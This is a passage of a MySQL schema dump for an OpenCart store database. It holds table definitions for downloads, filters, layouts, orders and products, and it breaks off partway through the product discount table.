/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_download`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_download` (
  `download_id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` varchar(128) NOT NULL,
  `mask` varchar(128) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`download_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_download_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_download_description` (
  `download_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`download_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_event`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_event` (
  `event_id` int(11) NOT NULL AUTO_INCREMENT,
  `code` varchar(32) NOT NULL,
  `trigger` text NOT NULL,
  `action` text NOT NULL,
  PRIMARY KEY (`event_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_extension`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_extension` (
  `extension_id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(32) NOT NULL,
  `code` varchar(32) NOT NULL,
  PRIMARY KEY (`extension_id`)
) ENGINE=MyISAM AUTO_INCREMENT=433 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_fields`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_fields` (
  `field_id` int(11) NOT NULL AUTO_INCREMENT,
  `field_name` varchar(255) NOT NULL,
  `field_image` varchar(255) DEFAULT NULL,
  `field_type` varchar(255) DEFAULT NULL,
  `field_must` tinyint(1) NOT NULL DEFAULT '0',
  `field_order` int(11) NOT NULL DEFAULT '0',
  `field_status` tinyint(1) NOT NULL DEFAULT '1',
  `field_public` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`field_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_fields_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_fields_description` (
  `field_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `field_description` text NOT NULL,
  `field_error` text NOT NULL,
  `field_value` text NOT NULL,
  `field` longtext NOT NULL,
  KEY `field_id` (`field_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_filter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_filter` (
  `filter_id` int(11) NOT NULL AUTO_INCREMENT,
  `filter_group_id` int(11) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`filter_id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_filter_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_filter_description` (
  `filter_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `filter_group_id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`filter_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_filter_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_filter_group` (
  `filter_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`filter_group_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_filter_group_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_filter_group_description` (
  `filter_group_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`filter_group_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_geo_zone`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_geo_zone` (
  `geo_zone_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `description` varchar(255) NOT NULL,
  `date_modified` datetime NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`geo_zone_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_information`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_information` (
  `information_id` int(11) NOT NULL AUTO_INCREMENT,
  `bottom` int(1) NOT NULL DEFAULT '0',
  `sort_order` int(3) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`information_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_information_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_information_description` (
  `information_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `title` varchar(64) NOT NULL,
  `description` text NOT NULL,
  `meta_title` varchar(255) NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  `meta_keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`information_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_information_to_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_information_to_layout` (
  `information_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`information_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_information_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_information_to_store` (
  `information_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  PRIMARY KEY (`information_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_language`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_language` (
  `language_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `code` varchar(5) NOT NULL,
  `locale` varchar(255) NOT NULL,
  `image` varchar(64) NOT NULL,
  `directory` varchar(32) NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY (`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_layout` (
  `layout_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`layout_id`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_layout_module`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_layout_module` (
  `layout_module_id` int(11) NOT NULL AUTO_INCREMENT,
  `layout_id` int(11) NOT NULL,
  `code` varchar(64) NOT NULL,
  `position` varchar(14) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`layout_module_id`)
) ENGINE=MyISAM AUTO_INCREMENT=151 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_layout_route`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_layout_route` (
  `layout_route_id` int(11) NOT NULL AUTO_INCREMENT,
  `layout_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `route` varchar(255) NOT NULL,
  PRIMARY KEY (`layout_route_id`)
) ENGINE=MyISAM AUTO_INCREMENT=97 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_length_class`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_length_class` (
  `length_class_id` int(11) NOT NULL AUTO_INCREMENT,
  `value` decimal(15,8) NOT NULL,
  PRIMARY KEY (`length_class_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_length_class_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_length_class_description` (
  `length_class_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `title` varchar(32) NOT NULL,
  `unit` varchar(4) NOT NULL,
  PRIMARY KEY (`length_class_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_location`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_location` (
  `location_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `address` text NOT NULL,
  `telephone` varchar(32) NOT NULL,
  `fax` varchar(32) NOT NULL,
  `geocode` varchar(32) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `open` text NOT NULL,
  `comment` text NOT NULL,
  PRIMARY KEY (`location_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_manufacturer`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_manufacturer` (
  `manufacturer_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`manufacturer_id`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_manufacturer_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_manufacturer_to_store` (
  `manufacturer_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  PRIMARY KEY (`manufacturer_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_marketing`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_marketing` (
  `marketing_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `description` text NOT NULL,
  `code` varchar(64) NOT NULL,
  `clicks` int(5) NOT NULL DEFAULT '0',
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`marketing_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_modification`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_modification` (
  `modification_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `code` varchar(64) NOT NULL,
  `author` varchar(64) NOT NULL,
  `version` varchar(32) NOT NULL,
  `link` varchar(255) NOT NULL,
  `xml` text NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`modification_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_module`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_module` (
  `module_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `code` varchar(32) NOT NULL,
  `setting` text NOT NULL,
  PRIMARY KEY (`module_id`)
) ENGINE=MyISAM AUTO_INCREMENT=42 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_option`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_option` (
  `option_id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(32) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`option_id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_option_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_option_description` (
  `option_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  PRIMARY KEY (`option_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_option_value`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_option_value` (
  `option_value_id` int(11) NOT NULL AUTO_INCREMENT,
  `option_id` int(11) NOT NULL,
  `image` varchar(255) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`option_value_id`)
) ENGINE=MyISAM AUTO_INCREMENT=52 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_option_value_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_option_value_description` (
  `option_value_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `option_id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  PRIMARY KEY (`option_value_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order` (
  `order_id` int(11) NOT NULL AUTO_INCREMENT,
  `invoice_no` int(11) NOT NULL DEFAULT '0',
  `invoice_prefix` varchar(26) NOT NULL,
  `store_id` int(11) NOT NULL DEFAULT '0',
  `store_name` varchar(64) NOT NULL,
  `store_url` varchar(255) NOT NULL,
  `customer_id` int(11) NOT NULL DEFAULT '0',
  `customer_group_id` int(11) NOT NULL DEFAULT '0',
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `email` varchar(96) NOT NULL,
  `telephone` varchar(32) NOT NULL,
  `fax` varchar(32) NOT NULL,
  `custom_field` text NOT NULL,
  `payment_firstname` varchar(32) NOT NULL,
  `payment_lastname` varchar(32) NOT NULL,
  `payment_company` varchar(40) NOT NULL,
  `payment_address_1` varchar(128) NOT NULL,
  `payment_address_2` varchar(128) NOT NULL,
  `payment_city` varchar(128) NOT NULL,
  `payment_postcode` varchar(10) NOT NULL,
  `payment_country` varchar(128) NOT NULL,
  `payment_country_id` int(11) NOT NULL,
  `payment_zone` varchar(128) NOT NULL,
  `payment_zone_id` int(11) NOT NULL,
  `payment_address_format` text NOT NULL,
  `payment_custom_field` text NOT NULL,
  `payment_method` varchar(128) NOT NULL,
  `payment_code` varchar(128) NOT NULL,
  `shipping_firstname` varchar(32) NOT NULL,
  `shipping_lastname` varchar(32) NOT NULL,
  `shipping_company` varchar(40) NOT NULL,
  `shipping_address_1` varchar(128) NOT NULL,
  `shipping_address_2` varchar(128) NOT NULL,
  `shipping_city` varchar(128) NOT NULL,
  `shipping_postcode` varchar(10) NOT NULL,
  `shipping_country` varchar(128) NOT NULL,
  `shipping_country_id` int(11) NOT NULL,
  `shipping_zone` varchar(128) NOT NULL,
  `shipping_zone_id` int(11) NOT NULL,
  `shipping_address_format` text NOT NULL,
  `shipping_custom_field` text NOT NULL,
  `shipping_method` varchar(128) NOT NULL,
  `shipping_code` varchar(128) NOT NULL,
  `comment` text NOT NULL,
  `total` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `order_status_id` int(11) NOT NULL DEFAULT '0',
  `affiliate_id` int(11) NOT NULL,
  `commission` decimal(15,4) NOT NULL,
  `marketing_id` int(11) NOT NULL,
  `tracking` varchar(64) NOT NULL,
  `language_id` int(11) NOT NULL,
  `currency_id` int(11) NOT NULL,
  `currency_code` varchar(3) NOT NULL,
  `currency_value` decimal(15,8) NOT NULL DEFAULT '1.00000000',
  `ip` varchar(40) NOT NULL,
  `forwarded_ip` varchar(40) NOT NULL,
  `user_agent` varchar(255) NOT NULL,
  `accept_language` varchar(255) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`order_id`),
  KEY `order_status_id` (`order_status_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_custom_field`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_custom_field` (
  `order_custom_field_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `custom_field_id` int(11) NOT NULL,
  `custom_field_value_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  `type` varchar(32) NOT NULL,
  `location` varchar(16) NOT NULL,
  PRIMARY KEY (`order_custom_field_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_history` (
  `order_history_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `order_status_id` int(11) NOT NULL,
  `notify` tinyint(1) NOT NULL DEFAULT '0',
  `comment` text NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`order_history_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_option`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_option` (
  `order_option_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `order_product_id` int(11) NOT NULL,
  `product_option_id` int(11) NOT NULL,
  `product_option_value_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  `type` varchar(32) NOT NULL,
  PRIMARY KEY (`order_option_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_product`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_product` (
  `order_product_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `model` varchar(64) NOT NULL,
  `quantity` int(4) NOT NULL,
  `price` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `total` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `tax` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `reward` int(8) NOT NULL,
  PRIMARY KEY (`order_product_id`),
  KEY `order_id` (`order_id`),
  KEY `product_id` (`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_recurring`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_recurring` (
  `order_recurring_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `reference` varchar(255) NOT NULL,
  `product_id` int(11) NOT NULL,
  `product_name` varchar(255) NOT NULL,
  `product_quantity` int(11) NOT NULL,
  `recurring_id` int(11) NOT NULL,
  `recurring_name` varchar(255) NOT NULL,
  `recurring_description` varchar(255) NOT NULL,
  `recurring_frequency` varchar(25) NOT NULL,
  `recurring_cycle` smallint(6) NOT NULL,
  `recurring_duration` smallint(6) NOT NULL,
  `recurring_price` decimal(10,4) NOT NULL,
  `trial` tinyint(1) NOT NULL,
  `trial_frequency` varchar(25) NOT NULL,
  `trial_cycle` smallint(6) NOT NULL,
  `trial_duration` smallint(6) NOT NULL,
  `trial_price` decimal(10,4) NOT NULL,
  `status` tinyint(4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`order_recurring_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_recurring_transaction`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_recurring_transaction` (
  `order_recurring_transaction_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_recurring_id` int(11) NOT NULL,
  `reference` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `amount` decimal(10,4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`order_recurring_transaction_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_status`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_status` (
  `order_status_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `name` varchar(32) NOT NULL,
  PRIMARY KEY (`order_status_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_total`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_total` (
  `order_total_id` int(10) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `code` varchar(32) NOT NULL,
  `title` varchar(255) NOT NULL,
  `value` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`order_total_id`),
  KEY `order_id` (`order_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_order_voucher`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_order_voucher` (
  `order_voucher_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `voucher_id` int(11) NOT NULL,
  `description` varchar(255) NOT NULL,
  `code` varchar(10) NOT NULL,
  `from_name` varchar(64) NOT NULL,
  `from_email` varchar(96) NOT NULL,
  `to_name` varchar(64) NOT NULL,
  `to_email` varchar(96) NOT NULL,
  `voucher_theme_id` int(11) NOT NULL,
  `message` text NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  PRIMARY KEY (`order_voucher_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product` (
  `product_id` int(11) NOT NULL AUTO_INCREMENT,
  `model` varchar(64) NOT NULL,
  `sku` varchar(64) NOT NULL,
  `upc` varchar(12) NOT NULL,
  `ean` varchar(14) NOT NULL,
  `jan` varchar(13) NOT NULL,
  `isbn` varchar(17) NOT NULL,
  `mpn` varchar(64) NOT NULL,
  `location` varchar(128) NOT NULL,
  `quantity` int(4) NOT NULL DEFAULT '0',
  `stock_status_id` int(11) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `manufacturer_id` int(11) NOT NULL,
  `shipping` tinyint(1) NOT NULL DEFAULT '1',
  `price` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `points` int(8) NOT NULL DEFAULT '0',
  `tax_class_id` int(11) NOT NULL,
  `date_available` date NOT NULL DEFAULT '0000-00-00',
  `weight` decimal(15,8) NOT NULL DEFAULT '0.00000000',
  `weight_class_id` int(11) NOT NULL DEFAULT '0',
  `length` decimal(15,8) NOT NULL DEFAULT '0.00000000',
  `width` decimal(15,8) NOT NULL DEFAULT '0.00000000',
  `height` decimal(15,8) NOT NULL DEFAULT '0.00000000',
  `length_class_id` int(11) NOT NULL DEFAULT '0',
  `subtract` tinyint(1) NOT NULL DEFAULT '1',
  `minimum` int(11) NOT NULL DEFAULT '1',
  `sort_order` int(11) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `viewed` int(5) NOT NULL DEFAULT '0',
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  `nominal_power_kwt` int(50) NOT NULL,
  `nominal_power_kwa` int(50) NOT NULL,
  `reserv_power_kwt` int(50) NOT NULL,
  `reserv_power_kwa` int(50) NOT NULL,
  `kpd` int(50) NOT NULL,
  `flag` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`product_id`)
) ENGINE=MyISAM AUTO_INCREMENT=99 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_attribute`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_attribute` (
  `product_id` int(11) NOT NULL,
  `attribute_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`product_id`,`attribute_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_description` (
  `product_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `tag` text NOT NULL,
  `meta_title` varchar(255) NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  `meta_keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`product_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_discount`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_discount` (
  `product_discount_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `customer_group_id` int(11) NOT NULL,
  `quantity` int(4) NOT NULL DEFAULT '0',
  `priority` int(5) NOT NULL DEFAULT '1',
  `price` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `date_start` date NOT NULL DEFAULT '0000-00-00',
